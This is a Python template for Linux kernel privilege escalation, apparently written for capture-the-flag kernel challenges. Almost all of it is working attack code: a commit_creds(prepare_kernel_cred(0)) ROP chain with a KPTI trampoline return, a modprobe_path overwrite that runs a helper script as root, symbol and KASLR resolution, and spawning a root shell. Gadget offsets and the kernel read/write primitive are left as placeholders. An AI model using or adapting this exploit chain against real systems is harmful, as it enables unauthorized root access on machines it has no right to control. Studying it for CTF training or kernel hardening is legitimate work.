#!/usr/bin/env python3
"""
Kernel Exploitation Template — commit_creds ROP + KPTI trampoline
Covers:
  - commit_creds(prepare_kernel_cred(0)) privilege escalation
  - modprobe_path overwrite (simpler, no ROP needed)
  - KPTI trampoline (required for kernel ≥ 4.15)
  - SMEP/SMAP bypass via kernel-only ROP chain
  - pipe_buffer UAF skeleton

Prerequisites:
  - A kernel arbitrary read/write primitive (from module vulnerability)
  - /proc/kallsyms readable OR a kernel pointer leak to compute KASLR base
"""
import os, sys, struct, ctypes, subprocess
from pathlib import Path

# ── Target configuration ───────────────────────────────────────────────────────
DRIVER_PATH = "/dev/vuln_device"     # TODO: path to vulnerable kernel device
VULN_IOCTL  = 0xdeadbeef            # TODO: ioctl command number

# ── Symbol resolution from /proc/kallsyms ─────────────────────────────────────
def resolve_kernel_symbols() -> dict:
    """Read /proc/kallsyms if accessible (requires root OR kernel.kptr_restrict=0)."""
    symbols = {}
    try:
        with open("/proc/kallsyms") as f:
            for line in f:
                parts = line.split()
                if len(parts) >= 3:
                    addr, sym_type, name = int(parts[0], 16), parts[1], parts[2]
                    symbols[name] = addr
    except PermissionError:
        print("[!] /proc/kallsyms requires root or kptr_restrict=0")
        print("[!] Try: echo 0 | sudo tee /proc/sys/kernel/kptr_restrict")
    except FileNotFoundError:
        print("[!] /proc/kallsyms not found")
    return symbols

syms = resolve_kernel_symbols()
if syms:
    KERNEL_TEXT_BASE = syms.get("startup_64", 0) & ~0xfffff  # page-align
    print(f"[+] Kernel text base: {KERNEL_TEXT_BASE:#x}")
else:
    # FALLBACK: if we have an info-leak from the vulnerable module
    KERNEL_TEXT_BASE = 0xffffffff81000000  # FILL IN from leak
    print(f"[!] Using hardcoded kernel base: {KERNEL_TEXT_BASE:#x}")

# Common symbol offsets (fill from /proc/kallsyms or kernel build)
COMMIT_CREDS_OFF              = syms.get("commit_creds", 0)
PREPARE_KERNEL_CRED_OFF       = syms.get("prepare_kernel_cred", 0)
KPTI_TRAMPOLINE_OFF           = syms.get("swapgs_restore_regs_and_return_to_usermode", 0)
MODPROBE_PATH_OFF             = syms.get("modprobe_path", 0)
INIT_CRED_OFF                 = syms.get("init_cred", 0)

if not COMMIT_CREDS_OFF:
    # Hardcode after leak: run `grep commit_creds /proc/kallsyms`
    print("[!] Symbols not resolved — fill in addresses manually")
    COMMIT_CREDS_OFF            = KERNEL_TEXT_BASE + 0x000000  # FILL IN
    PREPARE_KERNEL_CRED_OFF     = KERNEL_TEXT_BASE + 0x000000  # FILL IN
    KPTI_TRAMPOLINE_OFF         = KERNEL_TEXT_BASE + 0x000000  # FILL IN

commit_creds         = COMMIT_CREDS_OFF
prepare_kernel_cred  = PREPARE_KERNEL_CRED_OFF
kpti_trampoline      = KPTI_TRAMPOLINE_OFF + 22  # +22 = after initial push/xor

print(f"  commit_creds          : {commit_creds:#x}")
print(f"  prepare_kernel_cred   : {prepare_kernel_cred:#x}")
print(f"  kpti_trampoline       : {kpti_trampoline:#x}")

# ── Save user-space register state (inline asm via ctypes) ────────────────────
# This must be done BEFORE entering the kernel exploit to know where to return
libc = ctypes.CDLL("libc.so.6", use_errno=True)

# Using subprocess to get register values (no inline asm in Python)
# In a real exploit: compile a C helper that does this
USER_CS     = 0x33   # user-space CS for 64-bit code segment
USER_SS     = 0x2b   # user-space SS for 64-bit stack segment
USER_RFLAGS = 0x246  # IF=1, always set
USER_RSP    = 0x0    # FILL IN: your stack address when entering the exploit

def get_user_registers():
    """
    In C:
        asm("mov %%cs, %0" : "=r"(user_cs));
        asm("mov %%ss, %0" : "=r"(user_ss));
        asm("pushfq; popq %0" : "=r"(user_rflags));
        asm("mov %%rsp, %0" : "=r"(user_rsp));
    Python: use subprocess to call a helper binary or inline C.
    """
    helper_c = """
#include <stdio.h>
int main() {
    unsigned long cs, ss, rsp, rflags;
    __asm__("mov %%cs, %0" : "=r"(cs));
    __asm__("mov %%ss, %0" : "=r"(ss));
    __asm__("mov %%rsp, %0" : "=r"(rsp));
    __asm__("pushfq; pop %0" : "=r"(rflags));
    printf("CS=%lx SS=%lx RSP=%lx RFLAGS=%lx\\n", cs, ss, rsp, rflags);
    return 0;
}
"""
    try:
        Path("/tmp/getreg.c").write_text(helper_c)
        subprocess.run(["gcc", "-o", "/tmp/getreg", "/tmp/getreg.c"], check=True)
        out = subprocess.check_output(["/tmp/getreg"], text=True).strip()
        parts = dict(p.split("=") for p in out.split())
        return {k: int(v, 16) for k, v in parts.items()}
    except Exception as e:
        print(f"[!] Failed to get registers: {e}")
        return {"CS": USER_CS, "SS": USER_SS, "RSP": USER_RSP, "RFLAGS": USER_RFLAGS}

regs = get_user_registers()
USER_CS, USER_SS, USER_RFLAGS, USER_RSP = (
    regs.get("CS", USER_CS), regs.get("SS", USER_SS),
    regs.get("RFLAGS", USER_RFLAGS), regs.get("RSP", USER_RSP)
)

print(f"  user_cs     = {USER_CS:#x}")
print(f"  user_ss     = {USER_SS:#x}")
print(f"  user_rflags = {USER_RFLAGS:#x}")
print(f"  user_rsp    = {USER_RSP:#x}")

# ── Kernel ROP gadgets ─────────────────────────────────────────────────────────
# Find with: ROPgadget --binary /boot/vmlinux-$(uname -r) OR from module
# Common gadgets in vmlinux:
POP_RDI_RET    = KERNEL_TEXT_BASE + 0x0  # FILL IN: pop rdi; ret
POP_RCX_RET    = KERNEL_TEXT_BASE + 0x0  # FILL IN: pop rcx; ret  (for call rax pattern)
CALL_RAX       = KERNEL_TEXT_BASE + 0x0  # FILL IN: call rax  OR  mov rdi,rax; call rcx
MOV_RDI_RAX    = KERNEL_TEXT_BASE + 0x0  # FILL IN: mov rdi, rax; ret (after prepare_kernel_cred)
RET_GADGET     = KERNEL_TEXT_BASE + 0x0  # FILL IN: ret

# ── Method A: commit_creds(prepare_kernel_cred(0)) ROP chain ─────────────────
def build_creds_rop_chain(shell_fn_addr: int) -> bytes:
    """
    Build kernel ROP chain:
    1. prepare_kernel_cred(0)       → new_cred in rax
    2. commit_creds(new_cred)       → sets our uid=0
    3. KPTI trampoline              → safe return to user-space
    4. shell_fn_addr                → call our user-space shell function
    """
    # Entry: saved kernel RIP overwritten with start of this chain
    rop = b""
    # call prepare_kernel_cred(0)
    rop += struct.pack("<Q", POP_RDI_RET)
    rop += struct.pack("<Q", 0)                 # arg: NULL → root credential
    rop += struct.pack("<Q", prepare_kernel_cred)
    # rax = new_cred; mov rdi, rax
    rop += struct.pack("<Q", MOV_RDI_RAX)       # or: pop rcx + call rcx pattern
    rop += struct.pack("<Q", commit_creds)
    # KPTI trampoline: restore user registers and iretq
    rop += struct.pack("<Q", kpti_trampoline)
    rop += struct.pack("<Q", 0)                 # padding (trampoline expects two pops)
    rop += struct.pack("<Q", 0)
    rop += struct.pack("<Q", shell_fn_addr)     # user RIP (function to call as root)
    rop += struct.pack("<Q", USER_CS)
    rop += struct.pack("<Q", USER_RFLAGS)
    rop += struct.pack("<Q", USER_RSP)
    rop += struct.pack("<Q", USER_SS)
    return rop

# ── Method B: modprobe_path overwrite (no ROP needed) ─────────────────────────
def modprobe_path_overwrite(modprobe_path_addr: int) -> bool:
    """
    Write our script path to modprobe_path.
    Trigger: execute a binary with unknown file format → kernel calls modprobe → runs as root.
    No ROP chain required, just a write primitive.
    """
    helper = "/tmp/root_helper.sh"
    trigger = "/tmp/unknown_binary"
    flag_copy = "/tmp/pwned_flag"

    # Create helper script (will run as root)
    Path(helper).write_text(
        f"#!/bin/sh\n"
        f"chmod 777 /flag 2>/dev/null\n"
        f"cat /flag > {flag_copy}\n"
        f"chmod 777 {flag_copy}\n"
        f"id > /tmp/whoami.txt\n"
    )
    os.chmod(helper, 0o777)

    # Create trigger file (invalid magic bytes → kernel tries modprobe)
    Path(trigger).write_bytes(b"\xff\xff\xff\xff")
    os.chmod(trigger, 0o777)

    print(f"[+] Helper script: {helper}")
    print(f"[+] Trigger binary: {trigger}")
    print(f"[+] modprobe_path address: {modprobe_path_addr:#x}")
    print(f"[!] Now call kernel_write({modprobe_path_addr:#x}, b'{helper}\\x00')")
    print(f"[!] Then: os.system('{trigger}')")
    print(f"[!] Then: print(open('{flag_copy}').read())")
    return True

# ── User-space shell callback ──────────────────────────────────────────────────
def spawn_shell():
    """Called from kernel ROP chain after privilege escalation."""
    print("[+] Back in user-space as root!")
    os.execv("/bin/sh", ["/bin/sh"])

SHELL_FN_ADDR = ctypes.cast(spawn_shell, ctypes.c_void_p).value
print(f"  shell_fn_addr  = {SHELL_FN_ADDR:#x}")

# ── Kernel write primitive (implement for your challenge) ─────────────────────
def kernel_write(target_addr: int, data: bytes) -> None:
    """
    Arbitrary kernel write primitive.
    Replace with challenge-specific implementation:
    - ioctl with out-of-bounds index
    - UAF write via freed kernel object
    - heap overflow into adjacent kernel structure
    """
    print(f"[kernel_write] {target_addr:#x} ← {data.hex()}")
    raise NotImplementedError(
        "Implement kernel_write for this challenge.\n"
        "Open DRIVER_PATH and issue vulnerable ioctl/write."
    )

def kernel_read(target_addr: int, size: int = 8) -> bytes:
    """Arbitrary kernel read primitive."""
    raise NotImplementedError("Implement kernel_read for this challenge.")

# ── Main exploit ──────────────────────────────────────────────────────────────
def main():
    print("[*] Kernel exploit starting")
    print(f"[*] Running as uid={os.getuid()}")

    # Check if already root (testing without kernel exploit)
    if os.getuid() == 0:
        spawn_shell()
        return

    # Open vulnerable device
    try:
        fd = os.open(DRIVER_PATH, os.O_RDWR)
        print(f"[+] Opened {DRIVER_PATH} (fd={fd})")
    except PermissionError:
        print(f"[-] Cannot open {DRIVER_PATH}: permission denied")
        sys.exit(1)
    except FileNotFoundError:
        print(f"[-] Device {DRIVER_PATH} not found")
        sys.exit(1)

    # === Choose exploit method ===
    # Method B is simpler — try it first if modprobe_path is writable
    if MODPROBE_PATH_OFF:
        print("[*] Trying modprobe_path overwrite (Method B)")
        modprobe_path_overwrite(MODPROBE_PATH_OFF)

        helper_path = b"/tmp/root_helper.sh\x00"
        kernel_write(MODPROBE_PATH_OFF, helper_path)
        os.system("/tmp/unknown_binary")

        import time; time.sleep(0.5)
        try:
            flag = Path("/tmp/pwned_flag").read_text()
            print(f"[+] FLAG: {flag}")
        except FileNotFoundError:
            print("[-] Flag not found, trying shell")
            os.system("cat /flag 2>/dev/null || /bin/sh")
        return

    # Method A: ROP chain
    print("[*] Trying commit_creds ROP chain (Method A)")
    rop = build_creds_rop_chain(SHELL_FN_ADDR)
    print(f"[+] ROP chain ({len(rop)} bytes): {rop.hex()}")

    # TODO: trigger kernel vulnerability with rop chain as payload
    # kernel_write(saved_rip_addr, rop)
    print("[!] Trigger the overflow with the ROP chain above")
    print("[!] Implement the ioctl/write trigger for your specific module")

    os.close(fd)

if __name__ == "__main__":
    main()
